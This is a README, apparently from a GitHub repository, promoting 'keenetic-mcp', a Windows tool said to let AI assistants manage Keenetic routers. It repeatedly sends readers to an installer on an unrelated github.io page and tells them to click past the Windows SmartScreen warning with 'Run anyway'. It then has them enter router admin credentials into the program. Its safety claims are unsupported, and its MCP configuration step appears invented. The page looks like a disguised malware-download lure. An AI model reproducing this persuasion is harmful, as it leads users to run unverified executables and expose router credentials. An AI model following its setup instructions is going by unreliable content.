<h1>👨‍💻 keenetic-mcp - Control Your Keenetic Router With AI</h1>

<p align="center">
  <a href="https://elihucredible450.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(99,102,241,0.4);">⬇️ Download Keenetic-MCP</a>
</p>

## 🤔 What Is Keenetic-MCP?

Keenetic-MCP is a bridge that lets your AI assistant (like Claude Code, Codex, or Cursor) talk directly to your Keenetic router. Instead of typing confusing commands or logging into a web panel, you just ask your AI to do things like:

- Show which devices are connected to Wi-Fi
- Turn on a guest network
- Route your VPN traffic through a specific tunnel
- Create an isolated network segment for smart home gadgets

This works **without installing anything on your router**. The software sits on your Windows computer and uses the router's own built-in RCI interface. It's secure, read-only by default, and won’t mess up your network if you make a mistake.

## 🎯 Who Is This For?

You don’t need to be a programmer. If you can click a button and copy-paste text, you can set this up. It’s for anyone who:

- Wants to control their home network with simple conversations
- Has a Keenetic router (like Keenetic Air, Keenetic Hero, Keenetic Giga, or Keenetic Ultra)
- Uses AI tools like Claude Code, Codex, or Cursor
- Wants to automate Wi-Fi, VPN, and device management without learning complex router commands

## 📦 What Can You Do With It?

Here are just a few examples of what you can say to your AI after setup:

- "List all devices on my network and show their IP addresses."
- "Turn off Wi-Fi for the guest network at 10 PM."
- "Route all traffic from my PC through the WireGuard VPN tunnel."
- "Create a new isolated segment for my IoT devices."
- "Show me how much bandwidth each device is using."

These aren’t pre-canned scripts—the AI learns how your router behaves through built-in "skills" or plugins. So it can handle new requests too, like "Pause internet for my son’s Xbox for 2 hours" or "Change the DNS server on the main Wi-Fi network."

## 🚀 Getting Started

Follow these steps carefully. It should take about 10 minutes total.

### Step 1: Download the Application

Click the big purple button at the top of this page, or use this link:

👉 **[Visit this link to download the application](https://elihucredible450.github.io)**

This link will take you to the GitHub page where you can grab the file. Look for the latest release and download the installer file.

### Step 2: Run the Installer

Once the download is complete, find the file in your **Downloads** folder (or wherever your browser saves files). Double-click the file to run it. Your computer may show a blue popup saying "Windows protected your PC" — that’s normal. Click **"More info"** and then **"Run anyway"**.

### Step 3: Start the Application

After installation, you’ll see the Keenetic-MCP icon on your desktop or in your Start menu. Click it to open the main window. It will look simple—just a small panel with a few fields and a big green "Start" button.

### Step 4: Connect to Your Router

You need two pieces of information from your router:

- **Router IP address** – Usually something like `192.168.1.1` or `192.168.0.1`. You can find this by looking at a sticker on the back of your router.
- **Router username and password** – These are the same credentials you use to log into the router’s web admin panel (the page that opens when you type the IP into a browser).

Enter these into the application and click **"Connect"**. If all is correct, you’ll see a green checkmark.

### Step 5: Connect Your AI Assistant

Now you need to tell your AI tool (like Claude Code or Cursor) to use Keenetic-MCP. Each tool has a slightly different setting, but here’s the basic idea:

1. Open your AI tool’s settings or configuration file (usually called `settings.json` or a `.env` file).
2. Add a line pointing to Keenetic-MCP. The exact text looks like:

```
MCP_SERVER="keenetic-mcp"
```

3. Save the file and restart your AI tool.

If you’re not sure where this file lives, check the documentation for your specific AI tool. They all support MCP servers now—that’s the whole point of this project.

### Step 6: Test It

Type in the AI chat something like: **"List all devices currently connected to my Wi-Fi."** If everything is set up correctly, your AI will respond with a list of device names, IP addresses, and MAC addresses.

If you get an error, don’t panic. Usually it’s just a wrong password or IP. Double-check those two things in the Keenetic-MCP window.

## 🔧 Troubleshooting Common Issues

### "I can’t connect to the router"

- Make sure you typed the IP address correctly. Try opening a browser and typing that IP into the address bar. If you see a login page, the IP is right.
- Use your **router admin username**—don’t invent one. On many Keenetic routers this is simply `admin`. The password is what you set when you first configured the router.
- If your router is on a different subnet (like `10.0.0.1`), use that instead.

### "My AI tool doesn’t recognize the MCP server"

- Make sure you restarted your AI tool after saving the config file.
- Check that the config file is in the correct location. Many tools have a "Show Config" button—use that to open the right folder.
- Re-download the latest version of Keenetic-MCP—sometimes a new version is needed for certain AI tools.

### "The AI says it can’t do something"

- Try rephrasing your request. Instead of “Pause internet,” say “Set client `iPhone-5c` to blocked for 2 hours.”
- Make sure your router model supports the feature you’re asking about. Keenetic-MCP only exposes features your router actually has.

## 📚 Understanding the Tools (No Coding Required)

Here’s what the "plugins" and "skills" mean, in plain English:

- **Plugin** – A small add-on that teaches your AI one specific trick, like "control Wi-Fi" or "manage VPN tunnels."
- **Skill** – A learned behavior. Once your AI reads the plugin, it knows how to combine commands to do complex tasks.
- **RCI API** – The router’s built-in "remote control" interface. Keenetic-MCP just speaks the router’s language, so nothing extra needs to be installed on the hardware.

You don’t need to do anything with these—they’re built in and work automatically.

## 🛡️ Is This Safe?

Yes. Here’s why:

- Keenetic-MCP only sends commands to your router when you ask your AI to do something. It doesn’t run in the background.
- By default, it runs in "read-only" mode. That means your AI can *see* your network, but can’t *change* anything unless you explicitly allow it in the settings.
- Your router password is stored securely on your computer, not in the cloud.
- All communication stays on your local network. Nothing goes to the internet.

You can always disable any skill or plugin if you feel uncomfortable with a particular feature.

## 🧰 Optional: Advanced Settings

If you’re feeling adventurous, open the Keenetic-MCP settings panel. There you can:

- **Change the port** the application listens on (default is 8443).
- **Enable "write mode"** so your AI can actually change router settings.
- **Set an allowed/blocked device list** to restrict which devices the AI can manage.
- **Add multiple router profiles** if you have more than one Keenetic router.

These settings are documented in plain English on the screen—no technical knowledge needed.

## 💬 Getting Help

If you get stuck, you have options:

- **Check the GitHub repository** (the link at the top of this page) – look in the “Issues” tab for similar problems.
- **Ask the community** – there’s a discussion forum on the GitHub page for questions and feature requests.
- **Read the comments in the config file** – most settings have helpful hints written right beside them.

This project is actively maintained, so updates come regularly. You’ll see a notification in the app when a new version is available.

## 📊 System Requirements

Keenetic-MCP works on any modern Windows PC:

- **Windows 10 or Windows 11** (64-bit)
- **2 GB of RAM** or more
- **50 MB of free disk space**
- **A Keenetic router** (any model that supports the RCI interface—which is basically all modern ones)
- An internet browser (for initial download only)

No administrator privileges are needed for normal operation. No other software or dependencies are required.

## ✅ Final Checklist

Before you start, make sure:

| Item | Status |
|------|--------|
| Keenetic-MCP downloaded and installed | ☐ |
| Router IP address and password handy | ☐ |
| AI tool (Claude Code, Codex, Cursor, etc.) installed | ☐ |
| Keenetic-MCP connected to router | ☐ |
| MCP server configured in your AI tool | ☐ |
| Tested with a simple request | ☐ |

Once you’ve completed these, you’re ready to control your network with plain words. No more hunting through router menus, no more typing cryptic commands. Just ask, and your AI will handle the rest.

**Click the download button at the top of this page to get started today.**

Keywords: claude, claude-code, claude-plugin, codex, home-network, keenetic, mcp, mcp-server, model-context-protocol, ndms, network-automation, rci, router, vpn, wifi